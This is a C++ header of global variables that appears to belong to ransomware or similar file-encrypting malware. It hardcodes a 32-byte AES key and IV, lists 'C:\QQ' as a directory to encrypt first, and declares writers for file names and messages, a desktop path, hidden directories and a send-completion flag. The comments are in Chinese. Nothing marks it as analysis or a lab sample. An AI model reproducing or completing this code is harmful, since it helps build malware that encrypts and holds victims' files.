#pragma once
#include <string>
#include <vector>
#include <fstream>
#include <openssl/aes.h>
using std::string;
using std::vector;
using std::ofstream;

unsigned char aesKey[32] = { (unsigned char)0x34, (unsigned char)0x40, (unsigned char)0x9d, (unsigned char)0xfa, (unsigned char)0xb8, (unsigned char)0xe6,
					(unsigned char)0x3a, (unsigned char)0xc, (unsigned char)0x43, (unsigned char)0x38, (unsigned char)0x66, (unsigned char)0x87,
					(unsigned char)0xf0, (unsigned char)0xdc, (unsigned char)0x8c, (unsigned char)0xfa, (unsigned char)0xb8, (unsigned char)0xe6,
					(unsigned char)0xf0, (unsigned char)0xdc, (unsigned char)0x8c, (unsigned char)0xe2, (unsigned char)0xe2, (unsigned char)0xc,
					(unsigned char)0x8a, (unsigned char)0x24, (unsigned char)0x19, (unsigned char)0x54, (unsigned char)0x98, (unsigned char)0x4,
					(unsigned char)0x68, (unsigned char)0xa9 }; //AES密钥, 本版本中只用前16字节
unsigned char aesIv[16] = { (unsigned char)0x21, (unsigned char)0x56, (unsigned char)0xbd, (unsigned char)0x55, (unsigned char)0x67,
					(unsigned char)0x89, (unsigned char)0xe3, (unsigned char)0x45,	(unsigned char)0xf0, (unsigned char)0xde, (unsigned char)0x79,
					(unsigned char)0x56, (unsigned char)0x78, (unsigned char)0x43, (unsigned char)0x78, (unsigned char)0x23 };	//初始向量
char aesKeyLen = 16;                       //密钥长度
AES_KEY AesKey;
string EXEPATH = "";
string specialPaths[100] = { "C:\\QQ" }; //需要优先加密的目录
int specialPathNum = 1;                //特殊目录个数
vector<string> HideDir;
string FilePaths; //文件路径存储位置
string DesktopPath;
ofstream FileNameWriter;
ofstream MSGWriter;
int sendflag = -1; //发送完成的标记